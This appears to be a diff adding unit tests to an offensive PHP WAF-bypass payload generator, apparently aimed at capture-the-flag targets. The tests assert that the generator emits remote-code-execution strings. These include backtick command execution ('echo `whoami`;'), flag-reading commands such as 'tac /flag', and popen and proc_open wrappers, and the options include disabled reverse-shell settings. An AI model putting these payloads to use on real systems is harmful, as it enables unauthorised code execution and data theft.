@@ -1,10 +1,11 @@
-import unittest
+﻿import unittest
 import sys
 import os
 
 sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))
 
 from PureWaf import bypass
+from PureWaf import bypass_data
 from PureWaf import utils
 
 class TestNewTechniques(unittest.TestCase):
@@ -162,6 +163,45 @@ class TestNewTechniques(unittest.TestCase):
             payloads,
             "Variable scope hijacking payload not found",
         )
+
+    def test_backtick_templates_support_arbitrary_commands(self):
+        payloads = bypass._generate_php_rce_payloads("whoami", php_version=8.0)
+        self.assertIn("`whoami`", payloads)
+        self.assertIn("echo `whoami`;", payloads)
+        self.assertIn("print(`whoami`);", payloads)
+        self.assertIn("var_dump(`whoami`);", payloads)
+        self.assertIn("die(`whoami`);", payloads)
+        self.assertIn("exit(`whoami`);", payloads)
+
+        options = bypass.BypassOptions(
+            flagfile="/flag",
+            read_env=False,
+            reflect_shell=False,
+            ip="127.0.0.1",
+            port=8080,
+            phpinfo=False,
+            php_version=8.0,
+        )
+        generated = bypass.generate_candidates(options)
+        self.assertIn("echo `tac /flag`;", generated)
+        self.assertIn("print(`cat /flag`);", generated)
+
+    def test_readfile_templates_exclude_directory_listing_entries(self):
+        self.assertNotIn("ls {path}", bypass_data.READFILE_TEMPLATES)
+        self.assertNotIn("b=l;c=s;d={path};$b$c $d", bypass_data.READFILE_TEMPLATES)
+
+    def test_php_exec_wrappers_for_popen_and_proc_open(self):
+        self.assertIn("popen", bypass_data.PHP_EXEC_WRAPPERS)
+        self.assertIn("proc_open", bypass_data.PHP_EXEC_WRAPPERS)
+
+        payloads = bypass._generate_php_rce_payloads("id", php_version=8.0)
+        popen_payloads = [p for p in payloads if "popen(" in p]
+        proc_open_payloads = [p for p in payloads if "proc_open(" in p]
+
+        self.assertTrue(popen_payloads, "popen payload not found")
+        self.assertTrue(proc_open_payloads, "proc_open payload not found")
+        self.assertTrue(any("'r'" in p and "stream_get_contents" in p for p in popen_payloads))
+        self.assertTrue(any("$__spec=" in p and "$__pipes" in p for p in proc_open_payloads))
 
 if __name__ == '__main__':
     unittest.main()
